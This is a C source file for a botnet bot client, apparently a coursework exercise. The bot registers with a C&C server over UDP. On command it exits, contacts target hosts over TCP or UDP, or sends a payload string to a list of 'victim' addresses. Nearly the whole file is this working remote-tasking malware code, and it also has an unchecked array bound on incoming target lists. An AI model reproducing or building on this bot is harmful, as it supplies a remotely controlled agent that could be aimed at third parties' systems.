#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <stdbool.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <string.h>

#define MAX_UDP_THREAD_COUNT 50
#define MAX_TCP_THREAD_COUNT 50
#define MAX_MESSAGE_SIZE 1024

char payload[MAX_MESSAGE_SIZE] = "payload";
int stop_sending_flag = 1;
pthread_mutex_t mutex;

// Structure to hold the data for the UDP thread
struct data_for_registration_and_UDP {
    struct sockaddr_in CnC_server_addr;
    int UDP_socket;
};

struct data_to_handle_UDP {
    char *message;
    int UDP_socket;
    struct sockaddr_in incoming_addr;
    socklen_t incoming_addr_len;
    struct sockaddr_in CnC_server_addr;
    ssize_t message_size;
};

// Function that handles registration to C&C
void *send_registration_message(void *arg) {

    // Cast the argument to a pointer to the data_for_registration_and_UDP structure
    struct data_for_registration_and_UDP *reg_UDP_data = (struct data_for_registration_and_UDP *)arg;

    // Sending a message to the C&C server
    char *registration_message = "REG\n";
    if (sendto(reg_UDP_data->UDP_socket, registration_message, strlen(registration_message), 0, (const struct sockaddr *)&reg_UDP_data->CnC_server_addr, sizeof(reg_UDP_data->CnC_server_addr)) < 0) {
        perror("Send message failed");
    } else {
        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &reg_UDP_data->CnC_server_addr.sin_addr, ip_str, sizeof(ip_str));
        printf("Registration message sent to %s:%d\n", ip_str, ntohs(reg_UDP_data->CnC_server_addr.sin_port));
    }

    pthread_exit(NULL);
}

// Function that handles UDP messages
void *handle_UDP_message(void *arg) {

    // Cast the argument to a pointer to the data_to_handle_UDP structure
    struct data_to_handle_UDP *handle_UDP_data = (struct data_to_handle_UDP *)arg;

    printf("Recieved message: ");
        for(int i=0; i<handle_UDP_data->message_size; ++i){
            printf("%c", handle_UDP_data->message[i]);
        }
        printf("\n");

    // Checking if message is from C&C or from another source
    if ((memcmp(&handle_UDP_data->incoming_addr.sin_addr, &handle_UDP_data->CnC_server_addr.sin_addr, sizeof(struct in_addr)) == 0) && (ntohs(handle_UDP_data->incoming_addr.sin_port) == ntohs(handle_UDP_data->CnC_server_addr.sin_port))) {
        // Handle acording to command in message
        if(handle_UDP_data->message[0] == '0'){
            printf("Exiting bot program\n");
            exit(0);
        }
        else if(handle_UDP_data->message[0] == '1' || handle_UDP_data->message[0] == '2' || handle_UDP_data->message[0] == '3'){
            // Initializing a temp message that we can modify
            char *message_for_parsing = handle_UDP_data->message;
            // Initializing arrays in which the ips and ports of targets from C&C will be stored
            char ips[20][INET_ADDRSTRLEN];
            char ports[20][22];
            // Storing the command from C&C
            char command = message_for_parsing[0];
            message_for_parsing++;
            // Calculating the number of ip adresses and ports recieved from C&C
            int ip_port_pairs_received = (handle_UDP_data->message_size-1)/(INET_ADDRSTRLEN+22);
            for (int i = 0; i < ip_port_pairs_received; ++i) {
                // Copy IP address to ip array
                strncpy(ips[i], message_for_parsing, INET_ADDRSTRLEN);
                // Null-terminateing the string
                ips[i][INET_ADDRSTRLEN - 1] = '\0';
                // Increasing the pointer to new location
                message_for_parsing += INET_ADDRSTRLEN;
                // Copy ports to ports array
                strncpy(ports[i], message_for_parsing, 22);
                // Null-terminateing the string
                ports[i][22-1] = '\0';
                message_for_parsing += 22;
            }
            if(command == '1'){
                // Create TCP socket
                int TCP_sockfd;
                if ((TCP_sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                    perror("TCP_Socket creation failed");
                }
                // Inizializing the server struct
                struct sockaddr_in server_addr;
                memset(&server_addr, 0, sizeof(server_addr));
                server_addr.sin_family = AF_INET;
                server_addr.sin_port = htons(atoi(ports[0]));
                if (inet_pton(AF_INET, ips[0], &server_addr.sin_addr) <= 0) {
                    perror("Invalid IP address");
                }

                // Connecting to server
                if (connect(TCP_sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    printf("\nConnection Failed \n");
                }

                // Initializing the message for server
                char *TCP_message = "HELLO\n";
                // Initializing the buffer where recieved messages will be stored
                char recieved_TCP_message_buffer[MAX_MESSAGE_SIZE];

                // Send data to the server
                send(TCP_sockfd, TCP_message, strlen(TCP_message), 0);
                printf("Hello message sent\n");

                // Read response from the server
                int bytes_recieved = read(TCP_sockfd, recieved_TCP_message_buffer, MAX_MESSAGE_SIZE);
                if (bytes_recieved <= 0){
                    printf("Server disconnected or error occurred\n");
                }
                else{
                    printf("Received from server: %s\n", recieved_TCP_message_buffer);
                }

                // Close the socket
                close(TCP_sockfd);
            }
            else if(command == '2'){
                // Inizializing the victaddr struct
                struct sockaddr_in vict_addr;
                memset(&vict_addr, 0, sizeof(vict_addr));
                vict_addr.sin_family = AF_INET;
                vict_addr.sin_port = htons(atoi(ports[0]));
                if (inet_pton(AF_INET, ips[0], &vict_addr.sin_addr) <= 0) {
                    perror("Invalid IP address");
                }
                char *message_for_UDP_server = "HELLO";
                // Sending "HELLO" message to UDP_server
                if (sendto(handle_UDP_data->UDP_socket, message_for_UDP_server, strlen(message_for_UDP_server), 0, (const struct sockaddr *)&vict_addr, sizeof(vict_addr)) < 0) {
                    perror("Send message failed");
                } else {
                    printf("HELLO message sent to %s:%s\n", ips[0], ports[0]);
                }
            }
            else if(command == '3'){
                // Inizializing the victaddr struct
                struct sockaddr_in vict_addr;
                for(int i=0; i<ip_port_pairs_received; ++i){
                    memset(&vict_addr, 0, sizeof(vict_addr));
                    vict_addr.sin_family = AF_INET;
                    vict_addr.sin_port = htons(atoi(ports[i]));
                    if (inet_pton(AF_INET, ips[i], &vict_addr.sin_addr) <= 0) {
                        perror("Invalid IP address");
                    }

                    char current_payload[MAX_MESSAGE_SIZE];
                    // Locking the mutex for synchronisation issues and checking the current payload
                    pthread_mutex_lock(&mutex);
                    strcpy(current_payload, payload);
                    pthread_mutex_unlock(&mutex);
                    
                    // Sending payload to victims
                    if (sendto(handle_UDP_data->UDP_socket, current_payload, strlen(current_payload), 0, (const struct sockaddr *)&vict_addr, sizeof(vict_addr)) < 0) {
                        perror("Send message failed");
                    } else {
                        printf("\"%s\" message sent to %s:%s\n", current_payload, ips[i], ports[i]);
                    }
                }
            }
        }
        else if(handle_UDP_data->message[0] == '4'){
            // STOP signal recieved setting stop_sending_flag to 1 with mutex
            pthread_mutex_lock(&mutex);
            stop_sending_flag = 1;
            pthread_mutex_unlock(&mutex);       
            printf("STOP signal recieved\n");
        }
        else{
            printf("Recieved message from C&C: ");
            for(int i=0; i<handle_UDP_data->message_size; ++i){
                printf("%c", handle_UDP_data->message[i]);
            }
            printf("\n");
        }
    } else {
        printf("Recieved message: \"");
        for(int i=0; i<handle_UDP_data->message_size; ++i){
            printf("%c", handle_UDP_data->message[i]);
        }
        printf("\" from %s %d\n", inet_ntoa(handle_UDP_data->incoming_addr.sin_addr), ntohs(handle_UDP_data->incoming_addr.sin_port));
    }

    // Free the message memory
    free(handle_UDP_data->message);
    // Free the allocated data structure memory
    free(handle_UDP_data);

    pthread_exit(NULL);
}

// Listening for UDP messages and handling with threads
void *listen_for_UDP_message(void *arg){

    // Cast the argument to a pointer to the data_for_registration_and_UDP structure
    struct data_for_registration_and_UDP *reg_UDP_data = (struct data_for_registration_and_UDP *)arg;

    // Keeping track of active threads
    pthread_t UDP_threads[MAX_UDP_THREAD_COUNT];
    int UDP_thread_id = 0;

    // Initialize the struct where the incoming address will be stored
    struct sockaddr_in incoming_addr;
    socklen_t incoming_addr_len = sizeof(incoming_addr);

    // Initialize message buffer and continuously listen for UDP messages
    char UDP_message_buffer[MAX_MESSAGE_SIZE];
    while(true){
        // Receive UDP message
        ssize_t UDP_message_size = recvfrom(reg_UDP_data->UDP_socket, UDP_message_buffer, sizeof(UDP_message_buffer) - 1, 0, (struct sockaddr *)&incoming_addr, &incoming_addr_len);
        if (UDP_message_size < 0) {
            // If nothing is received, we continue
            continue;
        } else {
            // Null terminate the string
            UDP_message_buffer[UDP_message_size] = '\0';

            // If max number of threads is exceeded, start from the beginning
            if(UDP_thread_id >= MAX_UDP_THREAD_COUNT){
                UDP_thread_id = 0;
            }

            // Allocate memory for struct because of potential race Condition and initialize all variables that will be passed to the new thread
            struct data_to_handle_UDP *handle_UDP_data = malloc(sizeof(struct data_to_handle_UDP));
            if (handle_UDP_data == NULL) {
                perror("Failed to allocate memory");
                continue;
            }
            // Allocate memory for the message based on the size received
            handle_UDP_data->message = malloc(UDP_message_size);
            if (handle_UDP_data->message == NULL) {
                perror("Failed to allocate memory for message");
                free(handle_UDP_data);
                continue;
            }
            memcpy(handle_UDP_data->message, UDP_message_buffer, UDP_message_size);
            handle_UDP_data->UDP_socket = reg_UDP_data->UDP_socket;
            handle_UDP_data->incoming_addr = incoming_addr;
            handle_UDP_data->incoming_addr_len = incoming_addr_len;
            handle_UDP_data->CnC_server_addr = reg_UDP_data->CnC_server_addr;
            handle_UDP_data->message_size = UDP_message_size;

            // Create a thread to handle the UDP message
            if (pthread_create(&UDP_threads[UDP_thread_id], NULL, handle_UDP_message, (void *)handle_UDP_data) != 0) {
                perror("Failed to create thread");
                free(handle_UDP_data->message);
                free(handle_UDP_data);
                continue;
            }

            // Increase thread id for the next iteration
            UDP_thread_id++;
        }
    }
}

int main(int argc, char *argv[]) {

    // Program call options
    int opt;
    static struct option long_options[] = {
        {"help", no_argument, 0, 'h'},
        {"CnC_server_ip", required_argument, 0, 'i'},
        {"CnC_server_port", required_argument, 0, 'p'},
        {0, 0, 0, 0}
    };
    int long_index = 0; 
    // C&C IP and port
    char *CnC_server_ip = NULL;
    int CnC_server_port = 0;

    // Program call argument handling
    while ((opt = getopt_long(argc, argv, "hi:p:", long_options, &long_index)) != -1) {
        switch (opt) {
            case 'h':
                printf("Usage: %s [--help] [--CnC_server_ip IP_ADDRESS] [--CnC_server_port PORT]\n", argv[0]);
                exit(EXIT_SUCCESS);
            case 'i':
                CnC_server_ip = optarg;
                break;
            case 'p':
                CnC_server_port = atoi(optarg);
                break;
            default:
                fprintf(stderr, "Usage: %s [--help] [--CnC_server_ip IP_ADDRESS] [--CnC_server_port PORT]\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    // Checking the program call arguments
    if (CnC_server_ip == NULL || CnC_server_port == 0) {
        fprintf(stderr, "Error: --CnC_server_ip and --CnC_server_port are mandatory.\n");
        fprintf(stderr, "Usage: %s [--CnC_server_ip IP_ADDRESS] [--CnC_server_port PORT]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Program run messages
    printf("--Bot started--\n");
    printf("Server IP: %s\n", CnC_server_ip);
    printf("Server Port: %d\n", CnC_server_port);

    // Initialize mutex
    pthread_mutex_init(&mutex, NULL);

    // Create UDP socket
    int UDP_sockfd;
    if ((UDP_sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("UDP_Socket creation failed");
        return 1;
    }

    // Creating new thread IDs for registration and UDP
    pthread_t registration_thread, UDP_thread;

    // Set up the C&C server address struct
    struct sockaddr_in CnC_server_addr;
    memset(&CnC_server_addr, 0, sizeof(CnC_server_addr));
    CnC_server_addr.sin_family = AF_INET;
    CnC_server_addr.sin_port = htons(CnC_server_port);
    if (inet_pton(AF_INET, CnC_server_ip, &CnC_server_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        return 1;
    }

    // Data that needs to be passed for registration message to the thread
    struct data_for_registration_and_UDP reg_UDP_data;
    reg_UDP_data.CnC_server_addr = CnC_server_addr;
    reg_UDP_data.UDP_socket = UDP_sockfd;

    // Assign thread to send registration message and listen for UDP messages
    if (pthread_create(&registration_thread, NULL, send_registration_message, (void *)&reg_UDP_data) != 0) {
        perror("Failed to create registration_thread");
        return 1;
    }
    if (pthread_create(&UDP_thread, NULL, listen_for_UDP_message, (void *)&reg_UDP_data) != 0) {
        perror("Failed to create UDP_thread");
        return 1;
    }

    // Program finish
    pthread_join(registration_thread, NULL);
    pthread_join(UDP_thread, NULL);

    return 0;
}
